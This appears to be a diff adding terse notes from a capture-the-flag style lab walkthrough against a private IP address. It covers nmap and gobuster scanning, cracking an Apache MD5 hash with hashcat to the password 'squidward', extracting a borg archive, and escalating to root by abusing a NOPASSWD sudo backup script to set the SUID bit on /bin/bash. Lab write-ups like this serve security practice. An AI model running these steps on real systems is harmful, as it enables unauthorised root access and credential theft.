@@ -1,0 +1,23 @@
+10.49.173.247
+└─$ nmap -sC -sV -oN nmap.log 10.49.173.247
+
+gobuster dir -u http://10.49.173.247 -w /usr/share/wordlists/dirb/common.txt -x php -t 50 | tee gobuster.log
+
+hashcat -m 1600 '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' /usr/share/wordlists/rockyou.txt
+$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward 
+
+borg extract final_archive::music_archive
+
+tree
+
+ssh
+
+sudo -l
+ (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+
+sudo ./backup.sh -c "chmod +s /bin/bash"
+ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Apr  8  2020 /bin/bash
+bash -p
+
+
